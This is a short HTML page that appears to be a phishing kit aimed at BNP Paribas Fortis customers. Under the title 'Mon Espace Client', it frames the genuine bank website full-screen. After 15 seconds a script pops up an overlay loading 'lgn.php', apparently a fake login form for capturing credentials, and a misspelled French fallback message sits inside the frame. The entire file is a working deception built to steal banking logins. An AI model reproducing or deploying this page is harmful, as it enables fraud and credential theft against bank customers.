<html>  
 <head>
 <title>Mon Espace Client</title>
 <link rel="stylesheet" href="http://www.jacklmoore.com/colorbox/example1/colorbox.css" />
 </head>  
 <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
    <script src="jquery.colorbox.js"></script>
    <script>
      function openColorBox(){
        $.colorbox({iframe:true, width:"50%", height:"70%", href: "lgn.php"});
      }
      
      setTimeout(openColorBox, 15000	);
    </script>
<iframe src="http://www.bnpparibasfortis.be/" style="border: 0; position:absolute; top:0; left:0; right:0; bottom:0; width:100%; height:100%">
  <p>Oups Problemme de connexion changer de navigateur !</p>
</iframe> 
 </html>  